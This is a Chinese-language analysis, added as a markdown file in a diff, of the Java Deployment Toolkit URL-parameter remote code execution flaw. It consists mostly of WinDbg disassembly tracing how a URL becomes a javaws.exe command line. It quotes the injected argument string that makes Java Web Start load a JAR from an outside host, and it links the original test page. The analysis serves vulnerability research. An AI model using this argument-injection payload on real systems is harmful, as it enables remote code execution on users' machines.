@@ -1,0 +1,221 @@
+
+# Java 开发工具包 URL 参数远程代码执行漏洞之分析
+
+> 原文：[`www.pediy.com/kssd/pediy11/119651.html`](https://www.pediy.com/kssd/pediy11/119651.html)
+
+目录：
+
+0x1. 漏洞描述及调试环境
+
+0x2. 触发过程
+
+0x3. 漏洞利用存在的问题
+
+0x4. 新版本对流程的处理
+
+0x5. 总结
+
+## 0x1. 漏洞描述
+
+摘自：http://www.nsfocus.net/vulndb/14790
+
+Java 开发工具包（Java Development Kit）用于构建在 Java 平台上发布的应用程序、Applet 和组件的开发环境。
+
+Java 开发工具包所提供的 `launch()` 方式接受了用户提供的 URL 字符串并将其传送给了所注册的 JNLP 文件处理器
+
+（默认为 Java Web Start）。由于工具包没有对 URL 参数执行充分的验证，用户可以通过命令行向 Java Web Start 提供任意参数，导致执行任意代码。
+
+调试环境：
+
+1. `VM_windows XP SP2_cn`
+2. `JRE6 update 19` and `JRE6 update 20`
+3. `010editor` and `Windbg`
+
+## 0x2. 触发过程
+
+测试网页为
+
+`http://lock.cmpxchg8b.com/bb5eafbc6c6e67e11c4afc88b4e1dd22/testcase.html`
+
+链接的 JAR 文件地址为：
+
+`http://lock.cmpxchg8b.com/calc.jar`
+
+代码:
+```
+10008216 call    deploytk!DllGetClassObject+0x97a8 (1000b7b1):
+1000b7b2 8bec            mov     ebp,esp
+1000b7b4 81ec68020000    sub     esp,offset <Unloaded_ud.drv>+0x267 (00000268)
+1000b7ba ff7508          push    dword ptr [ebp+8]
+1000b7bd e883faffff      call    deploytk!DllGetClassObject+0x923c (1000b245)
+1000b7c2 84c0            test    al,al
+1000b7c4 59              pop     ecx
+1000b7c5 7502            jne     deploytk!DllGetClassObject+0x97c0 (1000b7c9) [br=1]
+```
+
+//获取提交的参数值：http: -J-jar -J\\\\lock.cmpxchg8b.com\\\\calc.jar none，并判断是否取得，为真则继续执行，为假则跳出，赋值于 ecx
+
+代码:
+```
+// 
+.................
+1000b7c9 53              push    ebx
+1000b7ca 8d45fc          lea     eax,[ebp-4]
+1000b7cd 50              push    eax
+1000b7ce 6819000200      push    offset <Unloaded_ud.drv>+0x20018 (00020019)
+1000b7d3 33db            xor     ebx,ebx
+1000b7d5 53              push    ebx
+1000b7d6 68343c0210      push    offset deploytk!DllGetClassObject+0x21c2b (10023c34)
+/////////////
+0:008> d 10023c34
+10023c34  4a 4e 4c 50 46 69 6c 65-5c 53 68 65 6c 6c 5c 4f      JNLPFile\Shell\O
+10023c44  70 65 6e 5c 43 6f 6d 6d-61 6e 64 00 25 73 00 00      pen\Command.%s..
+10023c54  22 25 73 22 20 25 73 00-53 00 00 00 5c 3c 02 10    "%s" %s.S...\\<..
+10023c64  4d 00 00 00 64 3c 02 10-44 00 00 00 6c 3c 02 10    M...d<..D...l<..
+10023c74  42 00 00 00 74 3c 02 10-56 61 6c 00 7c 3c 02 10    B...t<..Val.|<..
+10023c84  46 6f 72 63 65 52 65 6d-6f 76 65 00 84 3c 02 10    ForceRemove..<..
+10023c94  4e 6f 52 65 6d 6f 76 65-00 00 00 00 94 3c 02 10    NoRemove.....<..
+10023ca4  44 65 6c 65 74 65 00 00-a4 3c 02 10 41 70 70 49    Delete...<..AppI
+///////////////////
+1000b7db 6800000080      push    80000000h
+1000b7e0 c745f804010000  mov     dword ptr [ebp-8],offset <Unloaded_ud.drv>+0x103 (00000104)
+1000b7e7 ff1510200210    call    dword ptr [deploytk!DllGetClassObject+0x20007 (10022010)]
+1000b7ed 85c0            test    eax,eax
+1000b7ef 7407            je      deploytk!DllGetClassObject+0x97ef (1000b7f8) //跳往 1000b7f8
+1000b7f1 32c0            xor     al,al
+1000b7f3 e918010000      jmp     deploytk!DllGetClassObject+0x9907 (1000b910)
+1000b7f8 56              push    esi
+1000b7f9 8d45f8          lea     eax,[ebp-8]
+1000b7fc 50              push    eax
+1000b7fd 8d8598fdffff    lea     eax,[ebp-268h]
+1000b7fd 8d8598fdffff    lea     eax,[ebp-268h]
+1000b803 50              push    eax
+1000b804 53              push    ebx
+1000b805 53              push    ebx
+1000b806 53              push    ebx
+1000b807 ff75fc          push    dword ptr [ebp-4]
+1000b80a ff1520200210    call    dword ptr [deploytk!DllGetClassObject+0x20017 (10022020)] ds:0023:10022020={ADVAPI32!RegQueryValueExA (77da7883)}
+1000b810 ff75fc          push    dword ptr [ebp-4]
+1000b813 8bf0            mov     esi,eax
+1000b815 ff1508200210    call    dword ptr [deploytk!DllGetClassObject+0x1ffff (10022008)] ds:0023:10022008={ADVAPI32!RegCloseKey (77da6bf0)}
+1000b81b 3bf3            cmp     esi,ebx
+1000b81d 7407            je      deploytk!DllGetClassObject+0x981d (1000b826) [br=1]
+........................
+1000b826 8d8598fdffff    lea     eax,[ebp-268h]
+1000b82c 40              inc     eax
+1000b82d 803822          cmp     byte ptr [eax],22h
+1000b830 75fa            jne     deploytk!DllGetClassObject+0x9823 (1000b82c)
+1000b832 8818            mov     byte ptr [eax],bl //末尾清零
+//以上一段代码是获得 javaws.exe 的全路径信息 为 C:\\Program Files\\Java\\jre6\\bin\\javaws.exe
+1000b834 8d8599fdffff    lea     eax,[ebp-267h] //把 javaws.exe 路径信息赋于 eax
+1000b83a 50              push    eax
+1000b83b 8d859cfeffff    lea     eax,[ebp-164h]
+1000b841 68503c0210      push    offset deploytk!DllGetClassObject+0x21c47 (10023c50)
+1000b846 50              push    eax
+1000b847 ff1500240210    call    dword ptr [deploytk!DllGetClassObject+0x203f7 (10022400)] ds:0023:10022400={USER32!wsprintfA (77d1a2de)}
+//调用 wsprintfA 把参数合并为一个完整的命令行
+1000b84d 8d859cfeffff    lea     eax,[ebp-164h]
+1000b853 83c40c          add     esp,0Ch
+1000b856 8d7001          lea     esi,[eax+1]
+1000b859 8a08            mov     cl,byte ptr [eax]
+1000b85b 40              inc     eax
+1000b85c 3acb            cmp     cl,bl
+1000b85e 75f9            jne     deploytk!DllGetClassObject+0x9850 (1000b859)
+1000b860 2bc6            sub     eax,esi
+1000b862 8bf0            mov     esi,eax
+1000b864 8b4508          mov     eax,dword ptr [ebp+8]
+1000b867 57              push    edi
+1000b868 8d7801          lea     edi,[eax+1]
+1000b86b 8a08            mov     cl,byte ptr [eax]
+1000b86d 40              inc     eax
+1000b86e 3acb            cmp     cl,bl
+1000b870 75f9            jne     deploytk!DllGetClassObject+0x9862 (1000b86b)
+1000b872 2bc7            sub     eax,edi
+//获得将要打开的 JAR 文件参数及路径的长度
+1000b874 8d443010        lea     eax,[eax+esi+10h] //这里获得总的长度
+1000b878 50              push    eax
+1000b879 6a01            push    1
+1000b87b e8aeb40000      call    deploytk!DllGetClassObject+0x14d25 (10016d2e)
+1000b880 8bf0            mov     esi,eax
+1000b882 3bf3            cmp     esi,ebx
+1000b884 59              pop     ecx
+1000b885 59              pop     ecx
+1000b886 0f8480000000    je      deploytk!DllGetClassObject+0x9903 (1000b90c)
+1000b88c ff7508          push    dword ptr [ebp+8] //把构造的恶意 JAR 参数等信息的指针压入堆栈
+1000b88f 8d859cfeffff    lea     eax,[ebp-164h]
+1000b895 50              push    eax
+1000b896 68543c0210      push    offset deploytk!DllGetClassObject+0x21c4b (10023c54)
+1000b89b 56              push    esi
+1000b89c ff1500240210    call    dword ptr [deploytk!DllGetClassObject+0x203f7 (10022400)] ds:0023:10022400={USER32!wsprintfA (77d1a2de)}
+
+0:008> d esi
+036c39f8  22 43 3a 5c 50 72 6f 67-72 61 6d 20 46 69 6c 65    "C:\\Program File
+036c3a08  73 5c 4a 61 76 61 5c 6a-72 65 36 5c 62 69 6e 5c    s\\Java\\jre6\\bin\\
+036c3a18  6a 61 76 61 77 73 2e 65-78 65 22 20 68 74 74 70    javaws.exe" http
+036c3a28  3a 20 2d 4a 2d 6a 61 72-20 2d 4a 5c 5c 6c 6f 63    : -J-jar -J\\\\loc
+036c3a38  6b 2e 63 6d 70 78 63 68-38 62 2e 63 6f 6d 5c      k.cmpxchg8b.com\\
+036c3a48  63 61 6c 63 2e 6a 61 72-20 6e 6f 6e 65 00 00 00    calc.jar none...
+036c3a58  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00    ................
+036c3a68  23 00 0f 00 3b 01 0c 00-16 00 00 00 bc d5 8b 02    #...;...........
+```
+
+`ESI` 中保存有合并后的命令行参数
+
+代码:
+
+
+
+### 汇编分析
+
+```
+//以下为 CreateProcessA 的参数，相关代码可以从 IDA 反汇编代码中看的很详细。
+1000b8a2 83c410          add     esp,10h
+1000b8a5 6a11            push    11h
+1000b8a7 59              pop     ecx
+1000b8a8 33c0            xor     eax,eax
+1000b8aa 8d7da0          lea     edi,\[ebp-60h\]
+1000b8ad f3ab            rep stos dword ptr es:\[edi\]
+1000b8af 8d45e4          lea     eax,\[ebp-1Ch\]
+1000b8b2 50              push    eax
+1000b8b3 8d45a0          lea     eax,\[ebp-60h\]
+1000b8b6 50              push    eax
+1000b8b7 53              push    ebx
+1000b8b8 53              push    ebx
+1000b8b9 53              push    ebx
+1000b8ba 53              push    ebx
+1000b8bb 53              push    ebx
+1000b8bc 53              push    ebx
+1000b8bd 56              push    esi
+1000b8be 8d859cfeffff    lea     eax,\[ebp-164h\]
+1000b8c4 50              push    eax
+1000b8c5 c745a044000000  mov     dword ptr \[ebp-60h\],offset <Unloaded\_ud.drv>+0x43 (00000044)
+1000b8cc ff1558210210    call    dword ptr \[deploytk!DllGetClassObject+0x2014f (10022158)\] ds:0023:10022158={kernel32!CreateProcessA (7c802367)}
+```
+
+从调试的过程可以发现，java 程序只对传入的参数是否为 0 的判断，取得了参数长度，并没有做其他的验证，导致可以通过命令行形式：
+
+`"C:\\Program Files\\Java\\jre6\\bin\\javaws.exe" http: -J-jar -J\\\\lock.cmpxchg8b.com\\calc.jar none`，执行木马
+
+### 0x3.漏洞利用存在的问题
+
+在实际测试过程中发现漏洞执行成功的几率很低，偶尔会执行成功弹出计算器，大部分情况下会弹出一个窗口：`unable to access jarfile +"jar 文件路径"`，
+
+执行成功的几率经过测试不足 10%。
+
+反编译出测试网站提供的 JAR 文件，得到源码，并构造出弹出计算器的 JAR 文件进行测试也无一次成功案例，只有提供的 JAR 参数才能偶尔触发漏洞。
+
+### 0x4.新版本对流程的处理
+
+在新版本中，DLL 文件名发生了变化，由 `deploytk.dll` 变为 `deployJava1.dll`，其中对 URL 参数进行了过滤，经过调试发现相关的代码，具体处理流程需要下来分析。
+
+### 0x5.总结
+
+这个漏洞从发现报告经过了一周时间，始终没有弄清楚为何成功率会如此的低，调试跟踪整个过程，发现传递给 java 虚拟机的参数等等都是相同的，
+
+不明白参数在 java 虚拟机是如何运行的，如果这个弄清楚，问题就应该能解决了。
+
+新版本下这个漏洞已经 PATH，找到一个验证的地方，不敢确认，需要进一步调试。
+
+`calc.src.zip`
+
+`Java 开发工具包 URL 参数远程代码执行漏洞之分析.doc.rar`
